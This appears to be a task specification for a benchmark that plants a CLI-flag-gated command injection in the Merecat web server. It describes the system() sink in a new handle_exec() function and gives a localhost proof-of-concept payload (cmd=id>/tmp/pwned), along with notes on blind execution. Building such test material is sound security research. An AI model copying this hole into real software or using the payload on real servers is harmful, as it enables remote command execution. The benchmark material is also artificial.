DESCRIPTION:
  CLI-flag-gated command injection. The server must be started with --exec-mode
  for the vulnerable endpoint to be reachable. A user-supplied URL query
  parameter flows directly into system() with no sanitization.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard at the top of httpd_start_request()
              `if (exec_mode && strncmp(hc->encodedurl, "/exec", 5) == 0 ...)`
  complexity: one condition, one flag, no struct, no file parsing

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>  →  hc->query (set during request parsing)
  path:       httpd_start_request() dispatches to handle_exec()
              handle_exec() extracts the substring after "cmd=" via strncmp/pointer
              the raw query string is passed directly to system()
  transforms: none — no urldecode(), no snprintf() buffering, no copy

SANITIZATION (S1 — none):
  none

SINK:        system() in handle_exec() (src/libhttpd.c, injected before httpd_start_request)

CHANGED FILES:
  src/merecat.c — 3 hunks:
    1. global:          added `exec_mode` alongside other global config ints
    2. usage():         added --exec-mode entry in the usage printf block
    3. main():          pre-scan loop compacts --exec-mode out of argv before getopt

  src/libhttpd.c — 2 hunks:
    1. extern decl:     added `extern int exec_mode;` after existing extern declarations
    2. handle_exec():   new function before httpd_start_request(); direct system() call
    3. httpd_start_request(): exec route guard at the top of the function

EXPLOIT:
  build:   bash build.sh
  start:   ./merecat -n -p 18055 /tmp/www --exec-mode
  trigger: curl 'http://127.0.0.1:18055/exec?cmd=id>/tmp/pwned'
  verify:  cat /tmp/pwned
  expect:  uid=... line written by the server process

  gate bypass: omitting --exec-mode causes /exec to return 404 (falls through
               to normal file serving which cannot find the file on disk).

NOTES:
  - system() output goes to the server's stdout/stderr (inherited fds), not the
    HTTP response body. The response body contains only "Command dispatched: <cmd>".
    Use a write-to-file payload (id>/tmp/pwned) to confirm blind execution.
  - Payloads containing spaces must be encoded or use shell tricks since the query
    string is passed raw. Space-free payloads (id>/tmp/pwned) work directly.
  - The server runs in foreground mode (-n) to avoid daemonization for PoC use.
